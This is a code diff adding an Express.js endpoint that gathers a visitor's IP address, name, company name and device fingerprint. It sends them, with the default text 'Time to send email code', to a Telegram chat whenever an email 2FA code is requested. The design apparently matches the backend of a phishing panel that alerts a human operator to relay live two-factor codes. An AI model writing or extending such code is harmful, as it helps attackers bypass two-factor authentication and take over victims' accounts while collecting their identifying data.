@@ -827,6 +827,75 @@ app.post('/api/email-2fa/notify', async (req, res) => {
     .json({ result: true, status: 'email 2fa notification sent' });
 });
 
+// Email 2FA send-request - used when user requests an email code (short message)
+app.post('/api/email-2fa/request', async (req, res) => {
+  if (!isTelegramConfigured()) {
+    return res.status(503).json({
+      result: false,
+      status: 'Telegram notification is not configured on backend.',
+    });
+  }
+
+  const guestName =
+    typeof req.body?.guestName === 'string' && req.body.guestName.trim()
+      ? req.body.guestName.trim()
+      : 'Unknown';
+  const companyName =
+    typeof req.body?.companyName === 'string' && req.body.companyName.trim()
+      ? req.body.companyName.trim()
+      : 'Unknown Company';
+  const message =
+    typeof req.body?.message === 'string' && req.body.message.trim()
+      ? req.body.message.trim()
+      : 'Time to send email code';
+
+  const ipAddress = normalizeIpAddress(getClientIp(req)) || 'Unknown';
+
+  const data =
+    req.body?.data &&
+    typeof req.body?.data === 'object' &&
+    !Array.isArray(req.body?.data)
+      ? req.body.data
+      : null;
+
+  const allowedDeviceFields = new Set([
+    'Operating System',
+    'Browser',
+    'Screen Resolution',
+    'Timezone',
+  ]);
+
+  const formatDeviceData = (deviceObj) => {
+    if (!deviceObj || typeof deviceObj !== 'object') return '';
+    return Object.entries(deviceObj)
+      .filter(([key]) => allowedDeviceFields.has(key))
+      .map(
+        ([key, value]) =>
+          `${key}: ${Array.isArray(value) ? value.join(', ') : String(value).trim()}`
+      )
+      .join('\n');
+  };
+
+  const deviceDataLines = formatDeviceData(data);
+
+  const telegramMessage =
+    `IP: ${ipAddress}\nName: ${guestName}\n` +
+    (deviceDataLines ? `${deviceDataLines}\n` : '') +
+    `${companyName}: ${message}`;
+
+  const telegramRes = await sendTelegramMessage(telegramMessage);
+
+  if (!telegramRes.ok) {
+    return res.status(telegramRes.status || 502).json({
+      result: false,
+      status: telegramRes.message,
+      data: telegramRes.data,
+    });
+  }
+
+  return res.status(200).json({ result: true, status: 'email request sent' });
+});
+
 app.get('/health', async (_req, res) => {
   try {
     await pool.query('SELECT 1');
